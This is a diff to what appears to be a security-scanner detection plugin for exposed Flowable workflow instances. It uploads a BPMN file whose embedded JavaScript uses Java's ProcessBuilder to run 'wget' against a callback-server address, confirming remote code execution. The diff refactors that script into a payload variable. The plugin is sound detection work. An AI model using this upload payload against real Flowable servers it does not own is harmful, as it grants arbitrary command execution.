@@ -18,7 +18,7 @@ finding: {
     value: "FLOWABLE_EXPOSED_UI"
   }
   title: "Exposed Flowable instance"
-  description: "Flowable instance is exposed and can be used to compromise the system."
+  description: "Flowable instance is exposed and allows executing arbitrary code. Confirmed using 'wget' with the callback server."
   recommendation:
     "Configure authentication or ensure the Flowable instance is not exposed "
     "to the network. See "
@@ -53,7 +53,7 @@ actions: {
     headers: [
       { name: "Content-Type" value: "multipart/form-data; boundary=------------------------gxyhRpqEx2dfbXUDrMqEEL" }
     ]
-    data: '--------------------------gxyhRpqEx2dfbXUDrMqEEL\r\nContent-Disposition: form-data; name="file"; filename="jsScript.bpmn"\r\nContent-Type: application/octet-stream\r\n\r\n<?xml version="1.0" encoding="UTF-8"?>\n<definitions xmlns="http://www.omg.org/spec/BPMN/20100524/MODEL"\nxmlns:flowable="http://flowable.org/bpmn"\ntargetNamespace="Examples">\n\n<process id="jsScriptProcess" name="JavaScript Script Process">\n<startEvent id="start" />\n<sequenceFlow sourceRef="start" targetRef="scriptTask" />\n<scriptTask id="scriptTask" name="Execute Command via JavaScript"\nscriptFormat="javascript"\nflowable:autoStoreVariables="true">\n<script>\nvar ProcessBuilder = Java.type(\'java.lang.ProcessBuilder\');\nvar Arrays = Java.type(\'java.util.Arrays\');\nvar Scanner = Java.type(\'java.util.Scanner\');\n\nvar processBuilder = new ProcessBuilder(Arrays.asList(\'wget\', \'{{ T_CBS_URI }}\'));\nvar process = processBuilder.start();\n\nvar scanner = new Scanner(process.getInputStream()).useDelimiter("\\A");\nvar result = scanner.hasNext() ? scanner.next() : "";\n\nexecution.setVariable(\'commandOutput\', result);\n</script>\n</scriptTask>\n<sequenceFlow sourceRef="scriptTask" targetRef="end" />\n<endEvent id="end" />\n</process>\n\n</definitions>\n\r\n--------------------------gxyhRpqEx2dfbXUDrMqEEL--\r\n'
+    data: '--------------------------gxyhRpqEx2dfbXUDrMqEEL\r\nContent-Disposition: form-data; name="file"; filename="jsScript.bpmn"\r\nContent-Type: application/octet-stream\r\n\r\n<?xml version="1.0" encoding="UTF-8"?>\n<definitions xmlns="http://www.omg.org/spec/BPMN/20100524/MODEL"\nxmlns:flowable="http://flowable.org/bpmn"\ntargetNamespace="Examples">\n\n<process id="jsScriptProcess" name="JavaScript Script Process">\n<startEvent id="start" />\n<sequenceFlow sourceRef="start" targetRef="scriptTask" />\n<scriptTask id="scriptTask" name="Execute Command via JavaScript"\nscriptFormat="javascript"\nflowable:autoStoreVariables="true">\n<script>{{ payload }}</script>\n</scriptTask>\n<sequenceFlow sourceRef="scriptTask" targetRef="end" />\n<endEvent id="end" />\n</process>\n\n</definitions>\n\r\n--------------------------gxyhRpqEx2dfbXUDrMqEEL--\r\n'
     response: {
       http_status: 201
       expect_all: {
@@ -118,7 +118,7 @@ actions: {
 #############
 # WORKFLOWS #
 #############
-config { }
+config {debug: true }
 
 workflows: {
   actions: [
@@ -127,5 +127,8 @@ workflows: {
     "execute_tsunami_process",
     "sleep",
     "check_callback_server_logs"
+  ]
+  variables:[
+    { name: "payload" value: '\nvar ProcessBuilder = Java.type(\'java.lang.ProcessBuilder\');\nvar Arrays = Java.type(\'java.util.Arrays\');\nvar Scanner = Java.type(\'java.util.Scanner\');\n\nvar processBuilder = new ProcessBuilder(Arrays.asList(\'wget\', \'{{ T_CBS_URI }}\'));\nvar process = processBuilder.start();\n\nvar scanner = new Scanner(process.getInputStream()).useDelimiter("\\A");\nvar result = scanner.hasNext() ? scanner.next() : "";\n\nexecution.setVariable(\'commandOutput\', result);\n' }
   ]
 }
